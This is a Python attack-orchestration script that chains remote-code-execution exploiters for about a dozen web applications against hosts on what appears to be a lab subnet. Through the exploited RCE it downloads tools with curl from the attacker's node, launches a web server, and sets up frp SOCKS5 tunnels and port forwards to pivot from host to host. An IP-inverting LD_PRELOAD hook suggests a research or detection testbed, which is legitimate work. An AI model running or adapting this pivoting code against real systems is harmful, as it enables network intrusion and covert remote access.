import os
import random
import socket
import struct
import tempfile
import textwrap
import time

import requests
from requests.adapters import HTTPAdapter
from rich import print

from exploiters.geoserver_exploiter import GeoserverExploiter
from exploiters.gitlist_exploiter import GitlistExploiter
from exploiters.joomla_exploiter import JoomlaExploiter
from exploiters.juice_shop_exploiter import JuiceShopExploiter
from exploiters.kibana_exploiter import KibanaExploiter
from exploiters.metabase_exploiter import MetabaseExploiter
from exploiters.mongo_exploiter import MongoExploiter
from exploiters.ofbiz_exploiter import OfbizExploiter
from exploiters.pgadmin_exploiter import PgadminExploiter
from exploiters.python_demo_exploiter import PythonDemoExploiter
from exploiters.solr_exploiter import SolrExploiter
from utils import Exploiter

usable_ports = list(range(10000, 20000))


def available_port():
    try:
        return usable_ports.pop()
    except IndexError:
        raise Exception("No more ports available")


def random_str():
    return next(tempfile._get_candidate_names())


def get_folder_name():
    return f"/tmp/{random_str()}"


def execute_cmd(cmd: str):
    print(cmd)
    os.system(cmd)


# downloaded frp.tar.gz to /tmp

existed_files = set()


class LocalNode:
    def __init__(self, ip_: str):
        self.ip = ip_
        self.session = requests.Session()
        # adapater = HTTPAdapter(max_retries=10)
        # self.session.mount("http://", adapater)
        # self.session.mount("https://", adapater)
        self.web_server_port = available_port()
        self.init_node_ip = self.ip
        self.init_node_port = self.web_server_port
        self.build_web_server()

        self.frps_port = available_port()
        self.frps_proxy_dir = get_folder_name()

        execute_cmd(f"mkdir -p {self.frps_proxy_dir}")
        execute_cmd(f"cp -r /tmp/frp/* {self.frps_proxy_dir}")

        with open(f"{self.frps_proxy_dir}/frps.ini", "w") as temp_file:
            temp_file.write(
                textwrap.dedent(
                    f"""\
                    [common]
                    bind_port = {self.frps_port}
                    """
                )
            )

        execute_cmd(
            f"nohup {self.frps_proxy_dir}/frps -c {self.frps_proxy_dir}/frps.ini > {self.frps_proxy_dir}/frps.log 2>&1 &"
        )

        time.sleep(2)

    def build_web_server(self):
        self.upload_file("./frp.tar.gz", "frp.tar.gz")
        self.upload_file("./httpd", "httpd")
        self.execute_rce("tar -xzvf /tmp/frp.tar.gz -C /tmp/")
        self.execute_rce(f"chmod +x /tmp/httpd")
        self.execute_rce(
            f"/tmp/httpd /tmp --port {self.web_server_port} --daemon",
        )

    def execute_rce(self, cmd: str):
        execute_cmd(cmd)

    def upload_file(self, attack_file_path: str, file_name: str):
        if (self.ip, file_name) in existed_files:
            return

        self.execute_rce(f"cp -f {attack_file_path} /tmp/{file_name}")

        existed_files.add((self.ip, file_name))

    def map_to_attacker(self, port: int):
        # do nothing
        pass

    def send_request(self, method: str, *argvs, **argv):
        print(f"[Send Request] LocalNode")
        print(self.session.proxies)
        print(argvs[0])
        while True:
            try:
                if method.upper() == "GET":
                    res = self.session.get(*argvs, **argv, timeout=5)
                elif method.upper() == "POST":
                    res = self.session.post(*argvs, **argv, timeout=5)
                else:
                    raise Exception("Method not supported")
                break
            except (
                requests.exceptions.ReadTimeout,
                requests.exceptions.ConnectionError,
            ):
                print("Read error. Retry in 5 seconds.")
                time.sleep(5)
        return res


id_ = 0


def get_id():
    global id_
    id_ += 1
    return id_


class ControledNode:
    def __init__(
        self,
        exploiter: Exploiter,
        previous_proxier: "ControledNode | LocalNode",
        init_node: LocalNode,
    ):
        self.exploiter = exploiter
        self.previous_proxier = previous_proxier
        self.ip = exploiter.ip
        self.web_server_port = available_port()
        self.proxy_port = available_port()
        self.session = requests.Session()
        self.id_ = get_id()

        self.init_node_ip = init_node.ip
        self.init_node_port = init_node.web_server_port
        self.init_node_frps_port = init_node.frps_port

        # adapater = HTTPAdapter(max_retries=20)
        # self.session.mount("http://", adapater)
        # self.session.mount("https://", adapater)

        proxies = {
            "http": f"socks5://127.0.0.1:{self.proxy_port}",
            "https": f"socks5://127.0.0.1:{self.proxy_port}",
        }
        self.session.proxies.update(proxies)

        self.exploiter.exploit_rce_init(previous_proxier)
        self.build_proxy()

    def build_web_server(self):
        self.upload_file("./httpd", "httpd")
        self.execute_rce(f"chmod +x /tmp/httpd")
        self.execute_rce(
            f"/tmp/httpd /tmp --port {self.web_server_port} --daemon",
        )

    def upload_file(self, attack_file_path: str, file_name: str):
        # upload {attack_file_path} to /tmp/{file_name}
        if (self.ip, file_name) in existed_files:
            return

        # self.previous_proxier.upload_file(attack_file_path, file_name)
        os.system(f"cp -f {attack_file_path} /tmp/{file_name}")

        # if (self.ip, file_name) in existed_files:
        #     return

        self.execute_rce(
            f"curl -o /tmp/{file_name} http://{self.init_node_ip}:{self.init_node_port}/{file_name}",
        )

        # time.sleep(2)

        existed_files.add((self.ip, file_name))

    def build_proxy(self):
        self.build_web_server()

        self.upload_file("./frp.tar.gz", "frp.tar.gz")
        self.execute_rce(
            "tar -xzvf /tmp/frp.tar.gz -C /tmp/",
        )

        self.cur_proxy_dir = get_folder_name()
        self.pre_proxy_dir = get_folder_name()

        self.execute_rce(
            f"mkdir -p {self.cur_proxy_dir}",
        )
        self.execute_rce(
            f"cp -r /tmp/frp/* {self.cur_proxy_dir}",
        )
        # self.previous_proxier.execute_rce(
        #     f"mkdir -p {self.pre_proxy_dir}",
        # )
        # self.previous_proxier.execute_rce(
        #     f"cp -r /tmp/frp/* {self.pre_proxy_dir}",
        # )
        # execute_cmd(f"mkdir -p {self.pre_proxy_dir}")
        # execute_cmd(f"cp -r /tmp/frp/* {self.pre_proxy_dir}")

        # add frps to pre node
        # add frpc to cur node

        # frps_port = available_port()

        '''
        with open(f"{self.pre_proxy_dir}/frps.ini", "w") as temp_file:
            temp_file.write(
                textwrap.dedent(
                    f"""\
                    [common]
                    bind_port = {frps_port}
                    """
                )
            )

        execute_cmd(
            f"nohup {self.pre_proxy_dir}/frps -c {self.pre_proxy_dir}/frps.ini > {self.pre_proxy_dir}/frps.log 2>&1 &"
        )
        '''

        '''
        with tempfile.NamedTemporaryFile(mode="w") as temp_file:
            temp_file.write(
                textwrap.dedent(
                    f"""\
                    [common]
                    bind_port = {frps_port}
                    """
                )
            )
            temp_file.flush()
            frps_temp_loc = random_str()
            self.previous_proxier.upload_file(temp_file.name, frps_temp_loc)
            self.previous_proxier.execute_rce(
                f"cp /tmp/{frps_temp_loc} {self.pre_proxy_dir}/frps.ini"
            )
            self.previous_proxier.execute_rce(
                f"nohup {self.pre_proxy_dir}/frps -c {self.pre_proxy_dir}/frps.ini > {self.pre_proxy_dir}/frps.log 2>&1 &"
            )
        '''

        # time.sleep(2)

        with tempfile.NamedTemporaryFile(mode="w") as temp_file:
            temp_file.write(
                textwrap.dedent(
                    f"""\
                    [common]
                    server_addr = {self.init_node_ip}
                    server_port = {self.init_node_frps_port}
                    login_fail_exit = false

                    [socks5_proxy_{random_str()}]
                    type = tcp
                    remote_port = {self.proxy_port}
                    plugin = socks5
                    """
                )
            )
            temp_file.flush()
            frpc_temp_loc = random_str()
            self.upload_file(temp_file.name, frpc_temp_loc)
            self.execute_rce(f"cp /tmp/{frpc_temp_loc} {self.cur_proxy_dir}/frpc.ini")
            self.execute_rce(
                f"nohup {self.cur_proxy_dir}/frpc -c {self.cur_proxy_dir}/frpc.ini > {self.cur_proxy_dir}/frpc.log 2>&1 &"
            )

        time.sleep(2)

        # self.previous_proxier.map_to_attacker(self.proxy_port)

    def map_to_attacker(self, mapped_port: int):
        # add frps to cur
        # add frpc to prev
        frps_port = available_port()
        self.pre_map_dir = get_folder_name()
        self.cur_map_dir = get_folder_name()

        self.execute_rce(
            f"mkdir -p {self.cur_map_dir}",
        )
        self.execute_rce(
            f"cp -r /tmp/frp/* {self.cur_map_dir}",
        )

        self.previous_proxier.execute_rce(
            f"mkdir -p {self.pre_map_dir}",
        )
        self.previous_proxier.execute_rce(
            f"cp -r /tmp/frp/* {self.pre_map_dir}",
        )

        with tempfile.NamedTemporaryFile(mode="w") as temp_file:
            temp_file.write(
                textwrap.dedent(
                    f"""\
                    [common]
                    bind_port = {frps_port}
                    """
                )
            )
            temp_file.flush()
            frps_temp_loc = random_str()
            self.previous_proxier.upload_file(temp_file.name, frps_temp_loc)
            self.previous_proxier.execute_rce(
                f"cp /tmp/{frps_temp_loc} {self.pre_map_dir}/frps.ini"
            )
            self.previous_proxier.execute_rce(
                f"nohup {self.pre_map_dir}/frps -c {self.pre_map_dir}/frps.ini > {self.pre_map_dir}/frps.log 2>&1 &"
            )

        time.sleep(2)

        with tempfile.NamedTemporaryFile(mode="w") as temp_file:
            temp_file.write(
                textwrap.dedent(
                    f"""\
                    [common]
                    server_addr = {self.previous_proxier.ip}
                    server_port = {frps_port}
                    login_fail_exit = false

                    [port_proxy]
                    type = tcp
                    local_ip = 127.0.0.1
                    local_port = {mapped_port}
                    remote_port = {mapped_port}
                    """
                )
            )
            temp_file.flush()
            frpc_temp_loc = random_str()
            self.upload_file(temp_file.name, frpc_temp_loc)
            self.execute_rce(f"cp /tmp/{frpc_temp_loc} {self.cur_map_dir}/frpc.ini")
            self.execute_rce(
                f"nohup {self.cur_map_dir}/frpc -c {self.cur_map_dir}/frpc.ini > {self.cur_map_dir}/frpc.log 2>&1 &"
            )

        time.sleep(2)

        self.previous_proxier.map_to_attacker(mapped_port)

    def send_request(self, method: str, *argvs, **argv):
        print(f"[Send Request] {self.exploiter.__class__.__name__} {self.id_}")
        print(self.session.proxies)
        print(argvs[0])
        while True:
            try:
                if method.upper() == "GET":
                    res = self.session.get(*argvs, **argv, timeout=5)
                elif method.upper() == "POST":
                    res = self.session.post(*argvs, **argv, timeout=5)
                else:
                    raise Exception("Method not supported")
                break
            except (
                requests.exceptions.ReadTimeout,
                requests.exceptions.ConnectionError,
            ):
                print("Read error. Retry in 5 seconds.")
                time.sleep(5)
        return res

    def execute_rce(self, cmd: str):
        print(f"[Execute RCE {self.exploiter.__class__.__name__} {self.id_}] {cmd}")
        self.exploiter.exploit_rce(self.previous_proxier, cmd)

    def execute_no_rce(self):
        print(f"[Execute No RCE]")
        self.exploiter.exploit_no_rce(self.previous_proxier)


def ip_to_int(ip: str) -> int:
    """Convert an IPv4 address to a 32-bit integer."""
    return struct.unpack("!I", socket.inet_aton(ip))[0]


def int_to_ip(ip_int: int) -> str:
    """Convert a 32-bit integer to an IPv4 address."""
    return socket.inet_ntoa(struct.pack("!I", ip_int))


def invert_ip(ip: str) -> str:
    """Invert an IPv4 address."""
    ip_int = ip_to_int(ip)
    inverted_ip_int = ~ip_int & 0xFFFFFFFF  # Invert bits and ensure it's within 32 bits
    return int_to_ip(inverted_ip_int)


def get_ip(ip: str) -> str:
    if "hook_glibc_attacker.so" in os.environ.get("LD_PRELOAD", ""):
        return invert_ip(ip)
    return ip


def build_exploiters() -> list[Exploiter]:
    return [
        PythonDemoExploiter(get_ip("192.168.123.2")),  # rce + endpoint
        JuiceShopExploiter(get_ip("192.168.123.4")),  # rce
        GeoserverExploiter(get_ip("192.168.123.13")),  # rce
        GitlistExploiter(get_ip("192.168.123.15")),  # rce
        JoomlaExploiter(get_ip("192.168.123.17")),  # rce + endpoint
        KibanaExploiter(get_ip("192.168.123.26")),  # endpoint
        MetabaseExploiter(get_ip("192.168.123.30")),  # rce
        MongoExploiter(get_ip("192.168.123.32")),  # rce
        OfbizExploiter(get_ip("192.168.123.45")),  # rce
        PgadminExploiter(get_ip("192.168.123.47")),  # endpoint
        SolrExploiter(get_ip("192.168.123.53")),  # rce + endpoint
    ]


def attack():
    exploiters = build_exploiters()

    rce_exploiters = [exploiter for exploiter in exploiters if exploiter.is_rce]
    endpoint_exploiters = [
        exploiter for exploiter in exploiters if exploiter.is_endpoint
    ]

    random.shuffle(rce_exploiters)
    endpoint_exploiter = random.choice(endpoint_exploiters)

    last_node = LocalNode(get_ip("192.168.123.110"))
    init_node = last_node

    for exploiter in rce_exploiters:
        last_node = ControledNode(exploiter, last_node, init_node)
        time.sleep(2)

    endpoint_exploiter.exploit_rce_init(last_node)
    endpoint_exploiter.exploit_no_rce(last_node)


if __name__ == "__main__":
    attack()
